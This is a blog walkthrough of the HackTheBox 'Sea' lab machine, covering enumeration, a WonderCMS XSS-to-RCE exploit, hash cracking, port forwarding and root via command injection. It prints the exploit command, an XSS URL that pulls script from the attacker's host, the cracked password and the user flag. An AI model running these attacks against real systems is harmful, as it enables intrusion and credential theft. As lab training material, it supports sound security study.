---
title: "HackTheBox - Linux - Easy - Sea"
date: 2025-11-03 12:00:00 -0700
categories: [CTF,HackTheBox]
tags: [linux, web discovery, dirbust, burpsuite, RCE, XSS, reflected XSS, hash cracking]
---

![Sea](/assets/img/ctf/htb/easy/sea/Sea.png))

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
* Enumerate the webserver for a conact form<br/>
* Add the hostname in the URL to /etc/hosts and then dirbust/fuzz for directories and files<br/>
* Two files will detail the CMS and version to exploit<br/>
* Generate the payload, and then submit it to the contact form found earlier<br/>
* Enumerate other users via /home
* Enumerate /var/www for a config file that contains a password hash<br/>
* Crack the hash to get a passord <br/>
* The hash can be used to su with one of the two users enumerated earlier<br/>
* Enumerate active ports for a local webserver only acccessible from $sea<br/>
* SSH port forward with the user creds obtained earlier to port :9999 <br/>
* Navigate in-browser on $attacker to localhost:9999 (attacker:9999 in my case) to get to the hidden dashboard and use the same creds as earlier<br/>
* Capture the POST request with burp and URL encode commands to get a revshell as root<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $sea
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))                                              _http-title: Sea - Home                                     
```

Two services are active:
1. SSH
2. Webserver

SSH probably won't be useful until we at least enumerate a username or a password. I'll move on to the website for now.

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ feroxbuster --url http://$sea --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
```

I'll do some automated dirbusting while I walk the app with the browser.

![Website landing page](/assets/img/ctf/htb/easy/sea/1.png)

App landing page. Looking for interactive features or intel.

![How to participate](/assets/img/ctf/htb/easy/sea/2.png)

![Contact page](/assets/img/ctf/htb/easy/sea/3.png)

There's a contact page...

![Contact page 2](/assets/img/ctf/htb/easy/sea/5.png)

...but it doesn't resolve. I'll add the hostname present in the URL to the /etc/hosts file.

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ sudo vim /etc/hosts
[sudo] password for haunter:

10.10.11.28 sea.htb
```

Then I'll restart my dirbust and fuzzing efforts:

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ feroxbuster --url http://sea.htb/themes/bike/ --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
```

Two files are found that contain valuable intel:

```bash
http://sea.htb/themes/bike/README.md
http://sea.htb/themes/bike/version
```

The site's CMS:

*WonderCMS 3.2.0*

## Foothold

Here's the exploit I found for this particular version:

[WonderCMS Exploit](https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE)


```bash
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.17 -lport 4444 -sport 8000


http://sea.htb/loginURL/index.php?page=loginURL?"></form><script+src="http://10.10.14.17:8000/xss.js"></script><form+action="
```

Following the repository's instructions, a payload is generated. I had issues figuring out how to trigger this reflected XSS as it says a user needs to click it.

Then I recalled the contact form from earlier that accepted a website as a field:

![Contact form with payload](/assets/img/ctf/htb/easy/sea/13.png)

Started a local listener at :4444

![Local listener](/assets/img/ctf/htb/easy/sea/14.png)

I got a foothold after submitting the form.

Time for foothold recon.

```bash
www-data@sea:/var/www$ ls /home
amay
geo
```

We see two users, *amay* and *geo*.

I ran linPEAS and didn't see anything noticeable. On with more manual recon.

*/var/www* is often a good place to look besides */home* and */opt* for interesting files. After checking out the latter two locations, I enumerated the former and found a config file for a DB:

```bash
www-data@sea:/var/www$ ls sea/data                                                                                                                                                                                        
ls sea/data                                                                                                                                                                                                               
cache.json  database.js  files                                                                                                                                                                                            
www-data@sea:/var/www$ cat sea/data/database.js                                                                                                                                                                           
cat sea/data/database.js                                                                                                                                                                                                  
{                                                                                                                                                                                                                         
    "config": {                                                                                                                                                                                                           
        "siteTitle": "Sea",                                                                                                                                                                                               
        "theme": "bike",                                                                                                                                                                                                  
        "defaultPage": "home",                                                                                                                                                                                            
        "login": "loginURL",                                                                                                                                                                                              
        "forceLogout": false,                                                                                                                                                                                             
        "forceHttps": false,                                                                                 
        "saveChangesPopup": false,                                                                           
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",   
```

Nice, got a hash.


```bash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

Let's try to crack it.

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ printf '%s\n' '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
 
┌──(haunter㉿kali)-[~/working/htb/easy/sea]
└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

...
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance 
```

Hash cracked.

## Lateral Movement / Privilege Escalation

I tried the password with both users enumerated previously. *amay* can SSH with the cracked password.

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea/CVE-2023-41425-wonderCMS_RCE]
└─$ ssh amay@$sea 
amay@10.10.11.28's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)  

amay@sea:~$ ls -alh
total 32K
drwxr-xr-x 4 amay amay 4.0K Aug  1  2024 .
drwxr-xr-x 4 root root 4.0K Jul 30  2024 ..
lrwxrwxrwx 1 root root    9 Aug  1  2024 .bash_history -> /dev/null
-rw-r--r-- 1 amay amay  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 amay amay 3.7K Feb 25  2020 .bashrc
drwx------ 2 amay amay 4.0K Aug  1  2024 .cache
-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
drwx------ 2 amay amay 4.0K Feb 21  2024 .ssh
-rw-r----- 1 root amay   33 Nov  4 23:12 user.txt
amay@sea:~$ cat user.txt 
76883a41becaf8353c8a0e9942403a3c
amay@sea:~$ 
```

After getting the user flag, it's time to privEsc to root.

## Root / SYSTEM

*linPEAS* under *amay*'s user context shows a webserver running on :8080 that can only be accessed from $sea. 

![Active ports](/assets/img/ctf/htb/easy/sea/16.png)

That means we need to port forward to see what is there:

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/sea]                                                                  
└─$ ssh amay@$sea -p 22 -L 9999:127.0.0.1:8080                                                               
amay@10.10.11.28's password:                                                                                 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)   
```

I set my $attacker port for 9999 for the forward. 

This next part was a PITA. I'll explain in a bit.

```bash 
vim /etc/hosts


127.0.0.1   attacker
```

I set *127.0.0.1* to *attacker* and NOT *localhost* temporarily.

Then I navigated to http://attacker:9999 in-browser.

![Hidden dashboard](/assets/img/ctf/htb/easy/sea/17.png)

*amay*'s creds work here, too.

Alright, here's where things sucked for a bit.

![Hidden dashboard logged in](/assets/img/ctf/htb/easy/sea/18.png)

Once logged in, an interacive dashboard is presented. Examining the source shows that POST values are sent to the webserver, leaving the potential for exploitation.

HOWEVER, my Burp proxy + FoxyProxy, built-in Burp browser, and other setups were not capturing and intercepting traffic to/from *localhost:9999*. I even tried edit my kali's network proxy settings directly with no luck.

Eventually, I found a workaround: change *localhost* to anything else in */etc/hosts*. In my case I changed it to *attacker*. I was then able to intercept the traffic in Burpsuite.

Once the POST data is captured, edit variable and add bash commands with URL encoding to get revshell. Now you have root.

# Lessons Learned
* Use multiple lists for dirbusting and fuzzing.
* If an exploit is found that requires human interaction, consider system features that may emulate user actions, such as a contact form with a website field for a weblink-based payload
* Always check /var/www for sensitive files such as config files or DBs for credentials
* Check active ports for hidden/restricted webservers that require port forwarding to access
* If you need to capture *localhost* traffic, edit the hostname to something else, such as *attacker*. Be sure to revert this when do* Use multiple lists for dirbusting and fuzzing.
* If an exploit is found that requires human interaction, consider system features that may emulate user actions, such as a contact form with a website field for a weblink-based payload
* Always check /var/www for sensitive files such as config files or DBs for credentials
* Check active ports for hidden/restricted webservers that require port forwarding to access
* If you need to capture *localhost* traffic, edit the hostname to something else, such as *attacker*. Be sure to revert this when done
* URL encode payloads when injecting
